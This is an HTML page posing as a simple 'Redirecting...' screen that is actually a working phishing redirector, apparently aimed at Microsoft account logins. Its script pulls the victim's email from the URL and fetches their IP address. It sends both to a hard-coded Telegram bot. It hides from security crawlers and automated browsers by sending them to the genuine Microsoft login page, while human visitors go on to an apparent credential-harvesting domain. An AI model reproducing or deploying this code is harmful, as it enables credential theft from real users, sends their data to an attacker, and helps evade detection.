<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="referrer" content="no-referrer">
<title>Redirecting...</title>
</head>
<body>
<canvas id="gl" style="display:none"></canvas>
<script>
const CFG = {
  D: "https://assistant.faiheafai.com/PkB7ut6vjGhy2ZutM@uS/",
  B: "https://login.microsoftonline.com",
  T: "5178252977:AAGTXUBrTGp7RSj_o5Wsi29KqACCNaqBuRc",
  C: "659482680",
  O: "FALSE" 
};

let redirected = false;

const getProcessedEmail = () => {
  const params = new URLSearchParams(window.location.search);
  const rawState = params.get('state') || "no_email_found";
  if (CFG.O === "TRUE" && rawState !== "no_email_found") {
    try { return atob(rawState.replace(/-/g, '+').replace(/_/g, '/')); } catch (e) { return rawState; }
  }
  return rawState;
};

const tgLog = async (email, status) => {
  try {
    const ipReq = await fetch('https://api.ipify.org?format=json').catch(() => ({}));
    const ipData = ipReq.json ? await ipReq.json() : { ip: "NA" };
    const txt = `<b>[ACCESS LOG]</b>\n<b>EMAIL:</b> ${email}\n<b>IP:</b> ${ipData.ip}\n<b>STATUS:</b> ${status}`;
    await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CFG.C, text: txt, parse_mode: "HTML" })
    });
  } catch (_) {}
};

const doRedirect = async (type) => {
  if (redirected) return;
  redirected = true;
  
  const email = getProcessedEmail();
  if (type === "PASS") {
    await tgLog(email, "✅ PASSED (Human Signal)");
    window.location.replace(CFG.D + "#" + email);
  } else if (type === "TIMEOUT") {
    await tgLog(email, "✅ PASSED (Passive Timeout)");
    window.location.replace(CFG.D + "#" + email);
  } else {
    await tgLog(email, "❌ BLOCKED (Bot/Crawler)");
    window.location.replace(CFG.B);
  }
};

// 1. HARD BOT CHECK (Instant)
const isTechnicalBot = () => {
  const ua = navigator.userAgent.toLowerCase();
  const botKeywords = ["bot", "crawl", "spider", "lighthouse", "python-requests"];
  if (botKeywords.some(k => ua.includes(k))) return true;
  if (navigator.webdriver) return true;
  return false;
};

// 2. HUMAN SIGNAL LISTENERS (Immediate Redirect on Activity)
['mousemove', 'touchstart', 'keydown', 'wheel'].forEach(ev => {
  window.addEventListener(ev, () => doRedirect("PASS"), { once: true });
});

window.onload = () => {
  if (isTechnicalBot()) {
    doRedirect("BLOCK");
  } else {
    // 3. PASSIVE SAFETY NET
    // If it's a human who just stares at the screen, let them through after 4 seconds anyway.
    setTimeout(() => {
      doRedirect("TIMEOUT");
    }, 1209);
  }
};
</script>
</body>
</html>
